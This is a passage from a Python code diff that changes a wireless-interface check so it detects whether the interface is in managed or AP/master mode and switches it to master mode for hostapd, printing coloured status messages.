-                return False
-            
-            # Bring interface up again
-            subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=5)
-            time.sleep(2)
-            
-            # Verify interface is in managed mode
+            # Check current interface mode
             result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
-            if 'Mode:Managed' in result.stdout:
-                Color.pl('{+} {G}Interface {G}%s{G} confirmed in managed mode{W}' % interface)
-                return True
+            if result.returncode == 0:
+                if 'Mode:Master' in result.stdout or 'Mode:AP' in result.stdout:
+                    Color.pl('{+} {G}Interface {G}%s{W} is already in AP mode - skipping mode change{W}' % interface)
+                    return True
+                elif 'Mode:Managed' in result.stdout:
+                    Color.pl('{+} {C}Interface {G}%s{W} is in managed mode - switching to AP mode{W}' % interface)
+                    # Switch to master mode for hostapd
+                    success = self.switch_to_master_mode(interface)
+                    if not success:
+                        Color.pl('{!} {R}Failed to switch interface to AP mode{W}')
+                        return False
+                    return True
+                else:
+                    Color.pl('{+} {C}Interface {G}%s{W} mode unknown - attempting to set AP mode{W}' % interface)
+                    # Switch to master mode for hostapd
+                    success = self.switch_to_master_mode(interface)
+                    if not success:
+                        Color.pl('{!} {R}Failed to switch interface to AP mode{W}')
+                        return False
+                    return True
             else:
-                Color.pl('{!} {R}Interface verification failed - not in managed mode{W}')
+                Color.pl('{!} {R}Failed to check interface mode{W}')
                 return False
                 
         except Exception as e:
